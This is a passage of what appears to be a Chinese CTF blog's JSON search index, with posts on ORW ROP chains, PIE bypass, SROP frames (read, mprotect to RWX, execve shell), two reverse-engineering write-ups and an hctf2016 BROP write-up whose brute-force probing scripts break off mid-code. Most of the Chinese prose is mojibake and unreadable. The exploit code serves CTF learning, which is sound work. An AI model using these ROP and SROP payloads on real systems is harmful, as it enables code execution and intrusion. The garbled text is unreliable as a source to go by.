p64(ret)\norw += './flag\\x00\\x00'\norw += p64(0)\norw += p64(pop_rdi_ret) + p64(flag)\norw += p64(pop_rsi_ret) + p64(0)\norw += p64(pop_rax_ret) + p64(2)\norw += p64(syscall_ret)\norw += p64(pop_rdi_ret) + p64(3)\norw += p64(pop_rsi_ret) + p64(fake_rsp+0x200)\norw += p64(pop_rdx_ret) + p64(0x30)\norw += p64(libc_base+libc.sym['read'])\norw += p64(pop_rdi_ret) + p64(1)\norw += p64(libc_base+libc.sym['write'])\n```\n\nâ–²åŒæ ·å¯ä»¥ç”¨frameç»“æ„ä½“æ¥è°ƒç”¨å‡½æ•°ã€‚\n","tags":["ORW-Skill"],"categories":["ORW"]},{"title":"PIEç»•è¿‡æ€»ç»“","url":"/2021/08/19/PIEç»•è¿‡æ€»ç»“/","content":"\n1.åˆ©ç”¨PIEæœºåˆ¶ï¼Œçˆ†ç ´å€’æ•°ç¬¬å››ä½å¯ä»¥è·³è½¬åˆ°åŒä¸€ä¸ªå†…å­˜é¡µä¸­çš„ä»»æ„å‡½æ•°ã€‚\n\n2.åˆ©ç”¨æ ˆæº¢å‡ºå’Œæ‰“å°å‡½æ•°çš„å‚æ•°ï¼Œä¿®æ”¹åŠ«æŒrbpä½¿å¾—åˆ©ç”¨rbpå¯»å€çš„æ‰“å°å‡½æ•°çš„å‚æ•°æŒ‡å‘æ ˆä¸Šå…¶å®ƒä½ç½®ï¼Œé€šè¿‡çˆ†ç ´æ¥å¯»æ±‚æ³„éœ²Libcåœ°å€ã€‚\n\n3.åˆ©ç”¨vsyscallæˆ–è€…vdsoæ¥æ»‘è¿‡ä¸€æ®µæ ˆç©ºé—´ï¼Œä»è€Œå°†eipæŒªç§»åˆ°æ ˆåº•ä¸‹æ–¹æˆ‘ä»¬æƒ³è¦çš„åœ°å€å¤„ã€‚\n\n","tags":["PIE"],"categories":["PWN","PIE0x7"]},{"title":"SROPæ€»ç»“","url":"/2021/08/19/SROPæ€»ç»“/","content":"\nä¸€ã€SROPè°ƒç”¨çš„ç»“æ„ä½“ï¼Œåœ¨sigcontext.hä¸­æœ‰å®šä¹‰ï¼š\n\n1.32ä½ç¨‹åºï¼š\n\n(1)æ€»é•¿åº¦å…±è®¡ï¼š\n\n(2)è°ƒç”¨ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nA.32ä½ç³»ç»Ÿä¸Šè¿è¡Œ32ä½ç¨‹åºï¼š\ncontext.arch = 'i386'\nSigreturnFrame(kernel = 'i386')\n\nB.64ä½ç³»ç»Ÿä¸Šè¿è¡Œ32ä½ç¨‹åºï¼š\ncontext.arch = 'i386'\nSigreturnFrame(kernel = 'amd64')\n```\n\n2.64ä½ç¨‹åºï¼š\n\n(1)æ€»é•¿å…±è®¡ï¼š0xf8\n\n(2)è°ƒç”¨ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ncontext.arch = â€˜amd64â€™\nSigreturnFrame(kernel = â€˜amd64â€™)\n```\n\n \n\näºŒã€pwnä¸­ä½¿ç”¨ï¼š\n\n1.é¦–å…ˆå®šä¹‰ï¼š\n\nframe_func = SigreturnFrame()\n\n2.ä¹‹åè®¾ç½®å¯„å­˜å™¨ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nframe_func.rax = constants.SYS_func\nframe_func.rdi/rsi/......\nframe_func.rsp = stack_addr\n#æ ˆåŠ«æŒä¸€èˆ¬å¯ä»¥ç”¨åˆ°ï¼Œå³å½“SROPè¿è¡Œå®Œä¹‹åï¼Œæ ˆé¡¶å°±ä¼šè·³è½¬åˆ°è®¾ç½®çš„rspå¤„ï¼Œæ²¡è®¾ç½®åˆ™é»˜è®¤ä¸º0\nframe_func.rip = syscall_addr\n#è¿™é‡Œé€šè¿‡raxå’Œripé…åˆè°ƒç”¨ä»»æ„ç³»ç»Ÿå‡½æ•°ï¼Œå…¶å®ƒå¯„å­˜å™¨å°±æ˜¯ç”¨æ¥è®¾ç½®å‚æ•°çš„)\n```\n\n3.ä½¿ç”¨æ¡ä»¶ï¼š\n\n(1)æ²¡æœ‰sigreturn gadgetæŒ‡é’ˆæ—¶ï¼Œåˆ©ç”¨syscallæ¥è°ƒç”¨ï¼š\n\nâ‘ 64ä½éœ€è¦ç³»ç»Ÿè°ƒç”¨å·rax = 0xfã€‚32ä½éœ€è¦ç³»ç»Ÿè°ƒç”¨å·rax = 0x4d\n\n(è¿™ä¸ªä¸€èˆ¬å¯ä»¥é€šè¿‡readå‡½æ•°æ¥å®ç°ï¼Œä¿®æ”¹rax)\n\nâ‘¡è¿›å…¥æ—¶éœ€è¦æ‰§è¡Œsyscallï¼Œæ ˆé¡¶rspæŒ‡å‘frame_funcç»“æ„ä½“å¤´éƒ¨ã€‚\n\n(2)æœ‰sigreturnæŒ‡é’ˆæ—¶ï¼š\n\nç›´æ¥è¦†ç›–è¿”å›åœ°å€ä¸ºsigreturn gadgetï¼Œç„¶åè¯¥è¿”å›åœ°å€ä¸‹æ–¹çš„æ ˆä¸Šè¦†ç›–frame_funcç»“æ„ä½“ã€‚\n\n \n\nä¸‰ã€å¸¸ç”¨åŠŸèƒ½ï¼š\n\n1.readï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nframe_read = SigreturnFrame() #è®¾ç½®readçš„SROPå¸§\nframe_read.rax = constants.SYS_read\nframe_read.rdi = 0\nframe_read.rsi = stack_addr\nframe_read.rdx = 0x300\nframe_read.rip = syscall_addr\n```\n\n2.åˆ©ç”¨mprotectä¿®æ”¹å†…å­˜RWXæƒé™ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nframe_mprotect = SigreturnFrame()\n#è®¾ç½®mprotectçš„SROPå¸§ï¼Œç”¨mprotectä¿®æ”¹æ ˆå†…å­˜ä¸ºRWX\nframe_mprotect.rax = constants.SYS_mprotect\nframe_mprotect.rdi = stack_addr & 0xFFFFFFFFFFFFF000\nframe_mprotect.rsi = 0x1000\nframe_mprotect.rdx = constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC\nframe_mprotect.rsp = stack_addr\nframe_mprotect.rip = syscall_addr\n```\n\n3.getshell:\n\n```\n#æ³¨é‡Šå¤´\n\nframe_execve = SigreturnFrame()\nframe_execve.rax = constants.SYS_execve\nframe_execve.rdi = stack_addr+0x108\n#è¿™æ˜¯binshå­—ç¬¦ä¸²çš„åœ°å€\nframe_execve.rip = syscall_addr\n```\n\n \n\nå››ã€ç»“æ„ä½“ in /usr/include/bits/sigcontext.hï¼š\n\n```\n#æ³¨é‡Šå¤´  0xf8\n\nstruct sigcontext\n{\n__uint64_t r8;\n__uint64_t r9;\n__uint64_t r10;\n__uint64_t r11;\n__uint64_t r12;\n__uint64_t r13;\n__uint64_t r14;\n__uint64_t r15;\n__uint64_t rdi;\n__uint64_t rsi;\n__uint64_t rbp;\n__uint64_t rbx;\n__uint64_t rdx;\n__uint64_t rax;\n__uint64_t rcx;\n__uint64_t rsp;\n__uint64_t rip;\n__uint64_t eflags;\nunsigned short cs;\nunsigned short gs;\nunsigned short fs;\nunsigned short __pad0;\n__uint64_t err;\n__uint64_t trapno;\n__uint64_t oldmask;\n__uint64_t cr2;\n__extension__ union\n{\nstruct _fpstate * fpstate;\n__uint64_t __fpstate_word;\n};\n__uint64_t __reserved1 [8];\n};\n```\n\n \n\n```\n#æ³¨é‡Šå¤´    0x50\n\nstruct sigcontext\n{\nunsigned short gs, __gsh;\nunsigned short fs, __fsh;\nunsigned short es, __esh;\nunsigned short ds, __dsh;\nunsigned long edi;\nunsigned long esi;\nunsigned long ebp;\nunsigned long esp;\nunsigned long ebx;\nunsigned long edx;\nunsigned long ecx;\nunsigned long eax;\nunsigned long trapno;\nunsigned long err;\nunsigned long eip;\nunsigned short cs, __csh;\nunsigned long eflags;\nunsigned long esp_at_signal;\nunsigned short ss, __ssh;\nstruct _fpstate * fpstate;\nunsigned long oldmask;\nunsigned long cr2;\n};\n```\n\nå®é™…å¤§å°æœ€å¥½å¯¹åº”ç‰ˆæœ¬å†è°ƒè¯•\n","tags":["SROP"],"categories":["PWN","SROP0x8"]},{"title":"X-CTF-maze","url":"/2021/08/19/X-CTF-maze/","content":"\næ–‡ä»¶åœ°å€ï¼šhttps://github.com/PIG-007/X-CTF\n\n 1.æ‹–å…¥exeinfope.exeæŸ¥çœ‹ç‰ˆæœ¬ä½æ•°ï¼Œ64ä½ï¼Œè½½å…¥IDA.\n\n2.ç”±äºé¢˜ç›®mazeçš„æç¤ºï¼Œè¿˜æœ‰å‡½æ•°ä¸­ä¸€ç›´å‡ºç°çš„8ï¼Œå†åŠ ä¸Šåˆ¤æ–­è¯­å¥ä¸­\n\nasc_601060[8 * (signed int)v9 + SHIDWORD(v9)] != '#'\n\nä»¥åŠå­—ç¬¦ä¸²ï¼š\n\nâ€œ  *******  *  **** * ****  * ***  *#  *** *** ***   *********â€\n\nå¯çŸ¥æ˜¯èµ°è¿·å®«é¢˜ç›®ï¼Œä¹Ÿå°±æ˜¯å°†è¯¥å­—ç¬¦ä¸²ä»¥8ä½ä¸ºä¸€ä¸ªè¡Œï¼Œå½¢æˆä¸€ä¸ª8*8çš„è¿·å®«ï¼š\n\n![https://adworld.xctf.org.cn/media/task/writeup/cn/maze/10.png](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557487.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557287.jpeg)\n\næŒ‰ç…§1çš„è·¯å¾„ä¸€ç›´èµ°ï¼Œå…±èµ°18æ­¥ã€‚\n\n3.ç„¶åå†ä»”ç»†åˆ†æï¼Œåœ¨linuxä¸­è¿è¡Œï¼Œéœ€è¦è¾“å…¥flagï¼Œå†åœ¨IDAä¸­å‘ç°æœ‰è¾“å…¥é•¿åº¦è¦æ±‚ï¼Œå¾—æ˜¯nctf{xxxxx(18ä¸ª)}è¿™ç§å½¢å¼ã€‚ç„¶ååˆ†æè¿·å®«ï¼Œå‘ç°å–æœ€çŸ­è·¯å¾„èµ°åˆ°#åˆšå¥½æ˜¯18ä¸ªã€‚\n\n4.ç°åœ¨å¼€å§‹å¯»æ‰¾æ–¹å‘ï¼šå¾ˆå®¹æ˜“å‘ç°å››ä¸ªifè¯­å¥ï¼šï¼ˆè¿™é‡Œå¾—å³é”®å¯¹åº”çš„æ•°å­—-Rè½¬æˆå­—ç¬¦å½¢å¼ï¼Œæ‰èƒ½çœ‹åˆ°å¯¹åº”æ•°å­—çš„asciiç ï¼‰\n\nif ( v4 == 'O' )\n\nif ( v4 == 'o' )\n\nif ( v4 == '.' )\n\nif ( v4 == '0' )\n\nè¿™ä¸ªåº”è¯¥å°±æ˜¯ä»£è¡¨ä¸Šä¸‹å·¦å³äº†ï¼Œé‚£ä¹ˆç°åœ¨è¿˜å¾—åˆ¤æ–­ç©¶ç«Ÿæ˜¯å“ªä¸ªä»£è¡¨å“ªä¸ªã€‚è¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•ã€‚ä¸€æ˜¯æ¥ç€çœ‹ä»£ç ï¼Œè¿›å»é‡Œé¢ä»”ç»†åˆ†æï¼Œå¯ä»¥æ¨å‡ºã€‚äºŒæ˜¯é€šè¿‡è¿œç¨‹è°ƒè¯•æ¥åˆ¤æ–­ã€‚\n\nâ–²æ–¹æ³•ä¸€ï¼šæˆ‘ä»¬è¿›å…¥åˆ°å››ä¸ªifè¯­å¥ä¸­çš„æ¯ä¸ªå‡½æ•°ä¸­çœ‹çœ‹ï¼Œæœ‰ç±»ä¼¼å¦‚ä¸‹è¯­å¥ï¼š\n\nv1 = (*a1)--;\n\nv1 = *a1 + 1;\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557346.jpeg)![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557285.jpeg)\n\nä¼ å…¥çš„å€¼åˆ†åˆ«æ˜¯ï¼š&v10+4,å’Œ&v10ï¼Œè¿™é‡Œä¸åŒçš„IDAåæ±‡ç¼–å‡ºæ¥çš„å‚æ•°ä¸ä¸€æ ·ï¼Œä½†çœ‹v10çš„ç±»å‹æ˜¯ä¸€ä¸ªintå‹çš„æŒ‡é’ˆï¼Œ4ä¸ªå­—èŠ‚ä¸ºä¸€ä¸ªintï¼Œ&v10+4ä»£è¡¨intæŒ‡é’ˆå¾€ä¸‹æ‹¨åŠ¨ä¸€ä¸ªintï¼Œä¹Ÿå°±æ˜¯å¸¸è¯´çš„æŒ‡é’ˆ+1ï¼Œæœ‰çš„æ—¶å€™IDAä¹Ÿä¼šåæ±‡ç¼–ä¸º&v10+1ï¼Œè¿™æ˜¯ä»£è¡¨çš„æ˜¯&(V10+1)ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯æ‹¬å·æ²¡æœ‰å†™å‡ºæ¥ã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥å°†é¼ æ ‡ç§»åŠ¨åˆ°å˜é‡ä¸Šï¼ŒæŒ‰ä¸‹Yå¿«æ·é”®ï¼Œè¾“å…¥int[2]æ¥ä¿®æ”¹ï¼Œä¹‹åå†æŒ‰Nå¿«æ·é”®ä¿®æ”¹å˜é‡åç§°ä¸ºdirectionï¼Œæœ€ç»ˆå˜æˆ\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557350.jpeg)\n\nè¿™æ ·å°±æ¸…æ™°å¤šäº†ï¼Œè‡³äºä¸ºä»€ä¹ˆè¦int[2]ï¼Œå› ä¸ºè¿·å®«éƒ½æ˜¯äºŒç»´çš„ï¼Œä¸€èˆ¬å¯ç”¨x0yåæ ‡è½´æ¥è¡¨ç¤ºï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯å°†direction[1]læ¥ä»£è¡¨xè½´ï¼Œdirectionä»£è¡¨yè½´ï¼Œåä¹‹äº¦ç„¶ã€‚å¦‚ä¸‹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557351.jpeg)\n\né‚£ä¹ˆå°±æ˜¯Oå’Œoä»£è¡¨xè½´å·¦å³ï¼Œ0å’Œ.ä»£è¡¨yè½´ä¸Šä¸‹æˆ–è€…åè¿‡æ¥ï¼Œåˆ™flagå°±æœ‰ä¸¤ç§ï¼Œéƒ½åˆ—ä¸¾å‡ºæ¥æäº¤è¯•è¯•å°±å¯ä»¥å¾—åˆ°æ­£ç¡®ç­”æ¡ˆã€‚\n\nâ–²å°è¯•ç¬¬äºŒç§æ–¹æ³•ï¼Œè¿œç¨‹linuxä¸‹è°ƒè¯•ï¼šè¿™é‡Œè¿˜éœ€è¦çœ‹çœ‹æ¥ä¸‹æ¥çš„ä»£ç ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557829.jpeg)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557885.jpeg)\n\næ‰€æœ‰æ–¹å‘åˆ¤æ–­è¯­å¥ä¹‹åéƒ½ä¼šè·³è½¬åˆ°LABEL_14ï¼Œç”±æ­¤å¯ä»¥æ–­å®šå¾—æ˜¯åˆ¤æ–­æ­£ç¡®æ‰ä¼šbreakæ¥ä½¿å¾—label20ä¸è¢«è¿è¡Œï¼Œä»è€Œè·³å‡ºæ‰“å°é”™è¯¯flagçš„è¯­å¥ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦ä½¿å¾—v6=1ï¼Œç„¶åå†å‘ä¸Šæ‰¾æ‰¾ï¼Œæœ‰è¿™æ ·çš„è¯­å¥ï¼š\n\nè€Œv7åˆæ˜¯æ–¹å‘åˆ¤æ–­å‡½æ•°çš„è¿”å›å€¼ï¼Œæ‰€ä»¥åœ¨è¿è¡Œæ—¶å¯ä»¥å°è¯•çœ‹v7çš„å€¼æ¥åˆ¤æ–­è¾“å…¥çš„æ­£ç¡®ä¸å¦ã€‚äºæ˜¯åœ¨è¯¥å¤„ä¸‹æ–­ç‚¹ï¼Œæˆ–è€…å¯¹åº”æ±‡ç¼–ä»£ç ä¸­ï¼šmov bpl, alã€‚(é¼ æ ‡æ”¾åœ¨v7ä¸Šï¼Œæ˜¾ç¤ºalï¼Œè¯´æ˜v7æ˜¯å­˜æ”¾åœ¨alè¿™ä¸ªå˜é‡ä¸Šçš„)ï¼Œå°è¯•æ€§è¾“å…¥nctf{000000000000000000}ï¼Œè¾“å…¥å¤Ÿäº†å°±è¡Œï¼Œç„¶ååœ¨è¿è¡Œä¸­çœ‹v7ï¼Œä¹Ÿå°±æ˜¯alçš„å€¼ï¼Œå¦‚æœè¢«èµ‹å€¼ä¸º1ï¼Œåˆ™0å°±ä»£è¡¨å‘å³ï¼Œå› ä¸ºæˆ‘ä»¬è¿·å®«ä¸­ç¬¬ä¸€æ­¥å°±æ˜¯å‘å³çš„ï¼Œå¦åˆ™å°±æ¢ä¸‹ä¸€ä¸ªè¯•ã€‚ä¾æ¬¡ç±»æ¨ï¼Œå¯ä»¥é€šè¿‡è°ƒè¯•æ¥æ‘¸æ¸…æ–¹å‘ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557962.jpeg)\n\næ–­ç‚¹åœä½ï¼ŒæŸ¥çœ‹alçš„å€¼ä¸º1ï¼Œæœ¬æ¥åº”è¯¥è¯´æ˜0ä»£è¡¨å‘å³ï¼Œä½†æ˜¯å¦‚æœè¾“å…¥\n\nnctf{oooooooooooooooooo}ï¼Œalçš„å€¼ä¹Ÿæ˜¯1ã€‚è¿™é‡Œæ˜¯å› ä¸ºå³å’Œä¸‹éƒ½èƒ½èµ°ï¼Œä½†æ˜¯æºä»£ç ä¸­è¿˜æœ‰ä¸€ä¸ªåˆ¤æ–­é€»è¾‘ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557966.jpeg)\n\nä»£è¡¨æ’å¢™é€»è¾‘ï¼Œä¹Ÿå°±æ˜¯å¦‚æœæ’å¢™ä¸Šäº†ï¼Œä»ç„¶ä¼šæ‰“å°é”™è¯¯Flagã€‚æŸ¥çœ‹è¿·å®«ï¼Œå‘ç°å‘ä¸‹ä¼šæ’å¢™ä¸Šï¼Œè€Œå¯¹åº”nctf{oooooooooooooooooo}è°ƒè¯•çš„æ—¶å€™ï¼Œæ¥ç€å•æ­¥æ‰§è¡Œï¼Œä¼šå‘ç°ç¨‹åºå†ä¸€æ¬¡è¿›å…¥æ–¹å‘åˆ¤æ–­å‡½æ•°ï¼Œå¹¶æ²¡æœ‰ç›´æ¥è¿›å…¥æ’å¢™çš„é€»è¾‘ä¸­ï¼Œè¯´æ˜nctf{oooooooooooooooooo}çš„ç¬¬ä¸€ä¸ªæ‰æ˜¯å³ï¼Œè€Œnctf{000000000000000000}ä¼šæ’å¢™ä¸Šï¼Œè™½ç„¶v7çš„å€¼æ˜¯1ï¼Œä½†ä»ç„¶ä¼šå¯¼è‡´é”™è¯¯ã€‚æ‰€ä»¥0ä»£è¡¨ä¸‹ï¼Œoä»£è¡¨å³ï¼Œä¾æ¬¡ç±»æ¨å°±å¯ä»¥åˆ¤æ–­å‡ºæ–¹å‘ã€‚\n\næœ€ç»ˆflagä¸ºï¼šnctf{o0oo00O000oooo..OO}\n\n(Linuxè¿œç¨‹è°ƒè¯•å¯ä»¥çœ‹å…¶å®ƒæ–‡ç« )\n\n \n\n \n\n \n","tags":["First"],"categories":["REVERSE"]},{"title":"X-CTF-no_string","url":"/2021/08/19/X-CTF-no_string/","content":"\næ–‡ä»¶åœ°å€ï¼šhttps://github.com/PIG-007/X-CTF\n\n1.  è¿™æ˜¯ä¸€ä¸ªlinuxç¨‹åºï¼Œå…ˆåœ¨Linuxç¯å¢ƒä¸‹è·‘ä¸€ä¸‹ï¼Œè¾“å‡ºä¸¤ä¸²æ²¡ç”¨å­—ç¬¦ï¼Œå…¶ä¸­ä¸€ä¸ªæ˜¯æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ï¼Œä¸è¿‡è¿™ä¹Ÿä»£è¡¨äº†åº”è¯¥è¦è¾“å…¥ä¸œè¥¿ä¹‹åï¼Œæ˜¾ç¤ºæ­£ç¡®ï¼Œç„¶åæ‰“å°flagï¼Œæˆ–è€…ç›´æ¥è¾“å…¥flagï¼Œæ‰“å°æ­£ç¡®ã€‚\n2. è½½å…¥IDAï¼Œå‘ç°å…³é”®å‡½æ•°åœ¨authenticate()ä¸­çš„decrypt()ï¼Œå‡½æ•°decrypt()è¿›è¡Œä¸€å †ç®—æ³•ï¼Œç„¶åèµ‹å€¼ç»™s2ï¼Œå†å°†s2ä¸è¾“å…¥çš„å­—ç¬¦ä¸²ä½œæ¯”è¾ƒï¼Œä¸€æ ·å°±æ‰“å°æˆåŠŸï¼Œä½†æ˜¯ä¸æ‰“å°å…¶å®ƒå­—ç¬¦ä¸²ã€‚è¿™é‡Œå°±å¯ä»¥åˆ¤å®šæˆ‘ä»¬åº”è¯¥æ˜¯å¾—è¾“å…¥flagï¼Œç„¶åç¨‹åºåˆ¤æ–­åæ‰“å°æˆåŠŸã€‚é‚£ä¹ˆæˆ‘ä»¬éœ€è¦çš„flagå°±åº”è¯¥åœ¨s2ä¸­ã€‚è¿™é‡Œå°±å¯ä»¥åˆ†ä¸¤ç§æ–¹æ³•æ¥è·å–flagã€‚\n\nâ˜…ç¬¬ä¸€ç§ï¼šè®©ç¨‹åºè·‘èµ·æ¥ï¼Œç„¶åæŸ¥çœ‹s2æ‰€åœ¨å¯„å­˜å™¨çš„çš„å€¼\n\n(1)æ‰“å¼€linuxçš„è™šæ‹Ÿç¯å¢ƒï¼Œæ‰“å¼€ç»ˆç«¯ï¼Œè¾“å…¥gdb no_stringï¼Œå¼€å§‹ä½¿ç”¨gdbè½½å…¥ç¨‹åºã€‚\n\n(2)è¾“å…¥å‘½ä»¤b decryptï¼Œè¡¨ç¤ºåœ¨è¯¥å‡½æ•°å¤„ä¸‹æ–­ç‚¹ï¼Œä¹‹åè¾“å…¥rè®©ç¨‹åºè¿è¡Œè‡³æ–­ç‚¹å¤„åœæ­¢ã€‚\n\n(3)è¿™æ—¶å€™å› ä¸ºç¨‹åºæ˜¯åœåœ¨decryptè¿™ä¸ªå‡½æ•°ä¸Šï¼Œå¹¶æ²¡æœ‰æ‰§è¡Œè¯¥å‡½æ•°ï¼Œæ‰€ä»¥åº”è¯¥è¾“å…¥næ¥ä½¿å¾—ç¨‹åºè¿›è¡Œä¸€æ­¥ï¼Œè¿è¡Œè¯¥å‡½æ•°ã€‚\n\n(4)æ­¤æ—¶eaxå¯„å­˜å™¨ä¸­åº”è¯¥ä¿å­˜ç€s2ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬éœ€è¦çš„flagçš„å€¼ï¼Œæ‰€ä»¥è¾“å…¥å‘½ä»¤ï¼šx/200wx$eax æ¥è·å–eaxå¯„å­˜å™¨ä¸­çš„å€¼ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557048.jpeg)\n\nä»0x00000039ä¸€ç›´åˆ°å­—ç¬¦ä¸²ç»“å°¾å­—ç¬¦æ ‡å¿—0x00000000ï¼Œä¹Ÿå°±æ˜¯å¯¹åº”flagçš„å€¼ï¼Œå¤§å®¶ç›´æ¥é»è´´å‡ºæ¥è½¬asciiç å°±è¡Œã€‚\n\nâ–²200æ˜¯ä»£è¡¨æŸ¥çœ‹å¤šå°‘ä¸ªï¼Œwxæ˜¯ä»£è¡¨ä»¥wordå­—èŠ‚æŸ¥çœ‹ï¼Œ$eaxå³æ˜¯æŸ¥çœ‹è¯¥å¯„å­˜å™¨çš„å€¼ã€‚\n\n(å¦å¤–ï¼šå¯ä»¥é€šè¿‡IDApythonæ¥æ‰“å°ï¼Œä¹Ÿå°±æ˜¯å…ˆåœ¨linuxä¸‹è¿œç¨‹åŠ¨æ€è°ƒè¯•ï¼Œå°†æ–­ç‚¹åœåœ¨decryptä¸Šï¼Œç„¶åè¿è¡Œä¸€æ­¥ï¼Œåœ¨å³ä¸Šè§’å¯„å­˜å™¨çª—å£æ å³é”®eax-åœ¨æ•°æ®çª—å£è·Ÿéšï¼Œæ‰¾åˆ°eaxçš„é¦–åœ°å€ï¼Œè¿è¡Œå¦‚ä¸‹pyä»£ç ï¼š\n\n```\n#æ³¨é‡Šå¤´\naddr=0x0965D800#eaxé¦–åœ°å€ï¼Œæˆ–è€…ç‚¹å‡»eaxé¦–åœ°å€ï¼Œç„¶åæ¢æˆhere()\nans=\"\"\nfor temp addr in range(addr,addr+50*4,4):\n    ans+=get_bytes(tempaddr,1)\nprint(ans)\n```\n\n \n\nè¿™é‡Œaddr+50*4ä»£è¡¨ä»addrå¼€å§‹åç§»é‡ä¸º50*4ï¼Œå› ä¸ºå¯ä»¥çœ‹åˆ°eaxä¸­æ¯å››ä¸ªå­—èŠ‚å­˜ å‚¨ä¸€ä¸ªå­—ç¬¦æ•°æ®ï¼Œä¹Ÿå°±æ˜¯å‘ä¸‹è¯»å–50ä¸ªå­—ç¬¦ï¼Œç„¶ååé¢çš„4æ˜¯ä»¥4ä¸ªå­—èŠ‚ä¸ºä¸€ä¸ªå•ä½æ¥ç¿»è¯‘å­—ç¬¦)\n\nâ˜…ç¬¬äºŒç§ï¼š\n\n(1)åœ¨IDAä¸­æŸ¥çœ‹ä¼ å…¥decryptçš„ä¸¤ä¸ªæ•°æ®ï¼Œå¯ä»¥ç”¨Pyè„šæœ¬æ‰“å°æˆ–è€…æ˜¯ç‚¹è¿›å»ï¼Œç„¶åé€‰ä¸­æ•´ä¸ªæ•°æ®æ®µä¹‹åshift+Eï¼Œå¯ä»¥è½¬æ¢ä¸ºCç±»å‹æˆ–è€…æ˜¯hexç±»å‹å¯å¾—ã€‚\n\n(2)ç„¶åç¼–å†™é€†æ¨ç®—æ³•ï¼šåˆ©ç”¨åå…­è¿›åˆ¶æ¥è¡¨ç¤ºã€‚\n","tags":["First"],"categories":["REVERSE"]},{"title":"hctf2016-brop","url":"/2021/08/19/hctf2016-brop/","content":"\n1.é¢˜ç›®ç”¨ä»¥ä¸‹ä»£ç ç¼–è¯‘å’Œæ­å»ºï¼Œ[brop.c]å°±æ˜¯ç¨‹åºä»£ç æ–‡ä»¶\n\n```\n#æ³¨é‡Šå¤´\n\ngcc -z noexecstack -fno-stack-protector -no-pie brop.c -o brop\nsocat tcp-listen:10001,fork exec:./brop,reuseaddr &\n```\n\n2.ç¨‹åºä¸æ‰“å°æˆ‘ä»¬çš„è¾“å…¥ï¼Œå¹¶ä¸”è¾“å…¥å¤šä¸ª%pæ²¡ä»€ä¹ˆååº”ï¼Œé‚£ä¹ˆåº”è¯¥å°±ä¸æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ç›²æ‰“ï¼Œå°è¯•æ ˆæº¢å‡ºè¡Œä¸è¡Œï¼Œä½¿ç”¨è„šæœ¬çˆ†ç ´ä¸€ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ndef getbufferflow_length():\n    i = 1\n    while 1:\n        try:\n            sh = remote('127.0.0.1', 10001)\n            sh.recvuntil('WelCome my friend,Do you know password?\\n ')\n            sh.send(i * 'a')\n            output = sh.recv()\n            sh.close()\n            if not output.startswith('No password'):\n                return i - 1\n            else:\n                i += 1\n        except EOFError:\n            sh.close()\n            return i - 1\n\nbuf_size = getbufferflow_length()\nlog.info(\"buf_size:%d\"%buf_size)\n```\n\nä¸æ–­å°è¯•ï¼Œå¦‚æœæ²¡æœ‰æ¥æ”¶åˆ°â€œNo passwordâ€é‚£å°±ä»£è¡¨ç¨‹åºå‡ºé”™ï¼Œæ ˆæº¢å‡ºè¦†ç›–åˆ°äº†è¿”å›åœ°å€ï¼Œè¿™æ—¶å€™å°±é€€å‡ºï¼Œå…¶å®ƒé”™è¯¯ä¹Ÿé€€å‡ºã€‚æœ€åçˆ†ç ´å‡ºæ¥ä¸º72ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆbufçš„ç¼“å†²åŒºå°±æ˜¯72-8(rbp)=64ä¸ªå­—èŠ‚ã€‚(æ€»æ„Ÿè§‰è¿™é‡Œæœ‰ç‚¹é—®é¢˜ï¼Œå¦‚æœçœŸæ˜¯blindï¼Œé‚£ä¹ˆè‚¯å®šä¹Ÿä¸çŸ¥é“æ˜¯32ä½è¿˜æ˜¯64ä½å•Šï¼Œé‚£ä¹ˆå°±åº”è¯¥ä¸¤ç§æ–¹æ¡ˆéƒ½è¦å°è¯•ä¸€ä¸‹å§)\n\n3.å¯»æ‰¾å¯ä»¥ä½¿å¾—ç¨‹åºæŒ‚èµ·çš„stop_gadgetã€‚è¿™ä¸ªstop_gadgetæ˜¯ä»€ä¹ˆä¸é‡è¦ï¼Œåªè¦èƒ½è®©ç¨‹åºä¸å´©æºƒï¼Œèƒ½å¤Ÿåœ¨ä¹‹åæ¢ç´¢å…¶å®ƒå¯ä»¥ropçš„æ—¶å€™æ¥æ”¶åˆ°æ­£ç¡®çš„åé¦ˆï¼Œé‚£ä¹ˆæ˜¯ä»€ä¹ˆéƒ½å¯ä»¥ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\ndef get_stop_addr(buf_size):\n    addr = 0x400000\n    while True:\n        sleep(0.1)#ç¼“å†²\n        addr += 1\n        payload = \"A\"*buf_size\n        payload += p64(addr)#probe_addr\n        try:\n            sh = remote('127.0.0.1', 10001)\n            sh.recvline()\n            sh.sendline(payload)\n            sh.recvline()\n            sh.close()\n            log.info(\"stop address: 0x%x\" % addr)\n            return addr\n        except EOFError as e:#crash and restart\n            sh.close()\n            log.info(\"bad: 0x%x\" % addr)\n        except:#other error\n            log.info(\"Can't connect\")\n            addr -= 